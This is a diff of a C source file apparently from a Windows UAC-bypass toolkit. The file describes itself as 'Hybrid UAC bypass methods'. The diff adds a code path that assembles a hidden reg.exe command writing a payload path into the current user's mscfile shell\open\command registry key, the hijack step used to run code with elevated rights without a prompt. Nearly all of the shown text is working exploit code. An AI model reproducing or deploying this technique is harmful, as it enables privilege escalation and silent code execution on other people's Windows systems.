@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     3.01
+*  VERSION:     3.02
 *
-*  DATE:        30 Sep 2018
+*  DATE:        01 Oct 2018
 *
 *  Hybrid UAC bypass methods.
 *
@@ -2015,8 +2015,11 @@ BOOL ucmFwCplLuaMethod(
     _In_ LPWSTR lpszPayload
 )
 {
+    HANDLE           hProcess = NULL;
     HRESULT          r = E_FAIL, hr_init;
     BOOL             bCond = FALSE, bSymLinkCleanup = FALSE, bApprove = FALSE;
+
+    PWSTR            pszBuffer = NULL;
 
     LRESULT          lResult;
     HKEY             hKey = NULL;
@@ -2075,6 +2078,40 @@ BOOL ucmFwCplLuaMethod(
         sz = (1 + sz) * sizeof(WCHAR);
 
         switch (g_ctx.MethodExecuteType) {
+
+        case ucmExTypeIndirectModification:
+
+            pszBuffer = _alloca((MAX_PATH * 4) + sz);
+            _strcpy(pszBuffer, g_ctx.szSystemDirectory);
+            _strcat(pszBuffer, REG_EXE);
+            _strcat(pszBuffer, TEXT(" add "));
+            _strcat(pszBuffer, REG_HKCU);
+            _strcat(pszBuffer, TEXT("\\"));
+            _strcat(pszBuffer, T_MSC_SHELL);
+            _strcat(pszBuffer, T_SHELL_OPEN_COMMAND);
+            _strcat(pszBuffer, TEXT(" /d \""));
+            _strcat(pszBuffer, lpszPayload);
+            _strcat(pszBuffer, TEXT("\" /f"));
+
+            hProcess = supRunProcessIndirect(
+                pszBuffer,
+                NULL,
+                NULL,
+                0,
+                SW_HIDE,
+                NULL);
+
+            if (hProcess) {
+                dwKeyDisposition = REG_CREATED_NEW_KEY;
+                if (WaitForSingleObject(hProcess, 5000) == WAIT_TIMEOUT)
+                    TerminateProcess(hProcess, 0);
+                CloseHandle(hProcess);
+            }
+            else {
+                lResult = ERROR_ACCESS_DENIED;
+            }
+            
+            break;
 
         case ucmExTypeRegSymlink:
 
